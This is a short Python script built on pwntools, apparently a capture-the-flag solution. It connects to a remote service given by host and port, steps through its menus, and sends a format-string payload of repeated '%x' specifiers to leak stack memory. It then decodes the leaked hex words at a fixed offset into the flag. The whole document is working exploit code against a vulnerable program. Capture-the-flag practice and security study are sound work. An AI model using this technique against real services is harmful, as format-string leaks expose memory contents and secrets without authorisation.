#!/usr/bin/python
from pwn import *
import time
import getopt
import sys

#context.log_level='debug'

opts,argv=getopt.getopt(sys.argv[1:], 't:p:')

for k,v in opts:
    if k == '-t':
        target=v
    elif k == '-p':
        port=v

io=remote(target, port)

#time.sleep(12)

io.sendlineafter(b'Name:', b'jin') 
io.sendlineafter(b'name:', b'jin')
io.sendlineafter(b'selection\n>', b'2')
io.sendlineafter(b'>', b'1')
io.sendlineafter(b'>', b'2')

payload=b"%x "*22
io.sendlineafter(b'victory?', payload)

str(io.recvuntil(b"this:"),'utf-8')
response=str(io.recvuntil(b" \n"),'utf-8')
print(response)
l=response.split(' ',40)

flag=""
offset=12   # number of %x to flag
flen=11     # len of flag is 0x2c or 11 words
i=0

while i<=flen:
    b=bytes.fromhex(l[offset+i])
    b=b[::-1]
    flag=flag+b.decode("ASCII")
    i+=1

print(flag)
exit()